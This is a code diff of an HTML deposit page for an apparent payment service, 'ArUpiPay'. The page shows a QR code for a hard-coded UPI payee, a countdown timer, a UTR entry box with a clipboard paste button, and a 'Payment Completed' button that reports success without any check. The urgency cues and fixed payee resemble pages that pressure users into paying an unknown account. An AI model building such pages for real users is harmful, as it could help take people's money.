@@ -2,50 +2,76 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; }
+        .card { background: white; border-radius: 20px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+    </style>
 </head>
-<body class="bg-gray-50 p-4">
-    <div class="max-w-md mx-auto bg-white rounded-3xl p-6 shadow-xl">
-        <h1 class="text-3xl font-bold text-teal-600 mb-1" id="disp-amt">₹0.00</h1>
-        <p class="text-sm text-gray-500 mb-4">Mobile QR payment at <span id="timer" class="text-red-500 font-bold">05:00</span></p>
+<body class="p-4">
 
-        <div class="bg-gray-100 p-4 rounded-2xl mb-4 flex justify-center">
-            <div id="qrcode"></div>
+    <div class="max-w-md mx-auto">
+        <div class="flex justify-between items-center mb-4">
+            <h2 class="text-xl font-bold">ArUpiPay</h2>
+            <button class="bg-red-100 text-red-500 px-3 py-1 rounded-full text-xs font-bold">Customer Service</button>
         </div>
 
-        <div class="flex justify-center gap-4 mb-6 opacity-70">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/PhonePe_Logo.svg/1200px-PhonePe_Logo.svg.png" class="w-8 h-8">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Paytm_logo.png/1200px-Paytm_logo.png" class="w-8 h-8">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Pay_logo.svg/1200px-Google_Pay_logo.svg.png" class="w-8 h-8">
+        <div class="card mb-4 flex justify-between items-center">
+            <h1 class="text-2xl font-bold" id="disp-amt">₹0.00</h1>
+            <span id="timer" class="text-red-500 font-bold">14:35</span>
         </div>
 
-        <input type="text" id="utr-input" placeholder="Enter 12-digit UTR number" class="w-full p-4 bg-gray-50 border rounded-xl mb-4">
-        
-        <div class="flex gap-4">
-            <button onclick="cancelTrade()" class="flex-1 border py-3 rounded-xl font-bold">Trade cancelled</button>
-            <button onclick="submitUTR()" class="flex-1 bg-teal-600 text-white py-3 rounded-xl font-bold">Payment Completed</button>
+        <div class="grid grid-cols-2 gap-3 mb-4">
+            <div class="bg-cyan-100 border-2 border-cyan-400 p-3 rounded-xl text-center font-bold">Paytm</div>
+            <div class="bg-purple-100 border-2 border-purple-400 p-3 rounded-xl text-center font-bold">PhonePe</div>
         </div>
+
+        <div class="card text-center mb-4">
+            <div id="qrcode" class="flex justify-center mb-4"></div>
+            <p class="text-xs text-gray-500">1. Please use another device to scan QR</p>
+            <p class="text-xs text-gray-500">2. If you scan from gallery, amount may be limited</p>
+        </div>
+
+        <div class="card mb-6">
+            <label class="block text-sm font-bold mb-2">Input UTR/ Paste UTR</label>
+            <div class="flex border-2 border-gray-200 rounded-xl overflow-hidden">
+                <input type="text" id="utr-input" placeholder="Input 12 digits here" class="w-full p-3 outline-none">
+                <button onclick="pasteUTR()" class="bg-red-400 text-white px-4 font-bold">Paste</button>
+            </div>
+            <p class="text-[10px] text-red-600 mt-2 italic font-bold">If you do not back fill UTR/ paste UTR, 100% will fail.</p>
+        </div>
+
+        <button onclick="submitUTR()" class="w-full bg-teal-600 text-white py-4 rounded-xl font-bold text-lg">Payment Completed</button>
     </div>
 
     <script>
+        // 1. Amount & QR
         const amt = localStorage.getItem("lastAmount") || "200";
         document.getElementById('disp-amt').innerText = "₹" + amt;
-        new QRCode(document.getElementById("qrcode"), "upi://pay?pa=7186024384801SB1024@mairtel&am="+amt);
+        new QRCode(document.getElementById("qrcode"), { text: "upi://pay?pa=7186024384801SB1024@mairtel&am="+amt, width: 180, height: 180 });
 
-        function cancelTrade() {
-            if(confirm("Are you sure you want to cancel the trade?")) {
-                window.location.href = "dashboard.html";
-            }
+        // 2. Timer
+        let time = 875; // 14:35
+        setInterval(() => {
+            time--;
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+        }, 1000);
+
+        // 3. Paste Function
+        async function pasteUTR() {
+            const text = await navigator.clipboard.readText();
+            document.getElementById('utr-input').value = text;
         }
 
-        async function submitUTR() {
+        // 4. Submit
+        function submitUTR() {
             const utr = document.getElementById('utr-input').value;
-            if(utr.length < 9) { alert("Please enter valid UTR"); return; }
-            
-            // इथे Firebase ला UTR सह रेकॉर्ड सेव्ह करा (हे लॉजिक app.js मध्ये आहे)
-            alert("UTR Submitted! Redirecting to History...");
+            if(utr.length < 12) { alert("Please enter 12 digit UTR"); return; }
+            alert("UTR Submitted Successfully!");
             window.location.href = "deposit-history.html";
         }
     </script>
